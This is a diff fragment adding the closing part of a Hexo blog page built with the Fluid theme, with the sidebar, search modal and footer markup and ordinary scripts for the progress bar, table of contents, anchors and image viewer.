+                        <span class="hidden-mobile">Simple Sstackoverflow</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
